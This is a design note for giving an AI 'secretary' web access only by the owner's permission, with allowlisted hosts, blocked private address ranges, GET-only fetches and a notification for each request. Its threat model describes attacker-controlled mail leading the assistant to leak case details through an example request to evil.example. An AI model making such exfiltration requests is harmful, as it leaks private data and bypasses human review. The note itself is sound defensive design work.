# The secretary on the web, by permission — 2026-09-23

The owner, 2026-09-23: the secretary needs the Internet; it "can request
permission and I'll allow or deny", with "a notification if I'm not in the
app (and a popup or something)", a whitelist, and "always allow this
general website and have the llm draft a regex". Chain: `webaccess`
(project chain `suzatary`).

## 1. Why a permission and not a capability

The secretary reads attacker-controlled mail, and a web request leaks the
moment it is made (`GET https://evil.example/?q=<the case details>` needs no
write, so the chain's review boundary cannot see it). The channel closes
only if a person reads the exact URL first, or allowed its host in advance.

## 2. Rules, each a mechanism

1. **One verb, `web`, with a closed request.** `WebRequest` is
   `Search { query }` or `Fetch { url }`. `SearchQuery` is non-empty and
   bounded; `WebUrl` is `http(s)` with a host, no credentials, bounded
   length. Refused by construction: IP-literal hosts in loopback, private,
   link-local or CGNAT (tailnet) ranges, `localhost`, and names under
   `.local`, `.internal` and `.ts.net`.
2. **Allowed hosts run at once; everything else is asked.** `AllowRule` is
   `Host(exact)` or `Domain(suffix, subdomains included)`, optionally with
   a path prefix, matched on the parsed host by label
   (`wikipedia.org.evil.com` never matches `*.wikipedia.org`). An
   unallowed request is stored as `Act::Web` awaiting a tap; the verb
   answers that it asked.
3. **The card shows exactly what goes out**: the full URL, or the query and
   the provider's host. The tap performs it; the result lands in the
   conversation as a verb answer and the worker is nudged.
4. **"Always allow" is a second answer on the same card.** The secretary
   drafts an `AllowRule` with the request, the card states it in words, and
   that tap performs the request and appends the rule to `[secretary]
   web_allow` in the instance file (the provider-setup `Edits` path, same
   `Tap`). No regular expressions: a rule is a type the matcher reads.
5. **What a fetch may do.** GET only, no cookies or credentials, 10 s, at
   most 2 MB read, HTML to text by the mail reader's converter, capped.
   Names are resolved and every address checked against rule 1's ranges
   before connecting. Redirects are not followed: the answer names the
   target, which is a new request.
6. **Search is a fetch of the provider.** DuckDuckGo's HTML results,
   keyless, parsed to title, URL, snippet. Allowlisting its host is how
   searches stop needing a tap.
7. **You hear about a request.** A new web act pushes to the phone when no
   page watches the conversation; an open app shows a popup naming the
   host.

## 3. What this does not change

No bundle gains a mail-sending trait. Triage gets no web verb. The sweep's
verb list stays read-only, so it cannot ask either.

## 4. The series

1. core: `WebRequest`, `WebUrl`, `SearchQuery`, `AllowRule` and the
   matcher, with laws (look-alike hosts, ranges, redirects-as-new).
2. io: fetcher and search parser over `ureq`, address check at connect.
3. core: the `web` verb and `Act::Web`; the tap performs it; surface
   snapshot and SECRETARY.md.
4. cli: `[secretary] web_allow` read live; "Always allow" appends a rule.
5. notify + web: the push, the popup, the card with both answers.
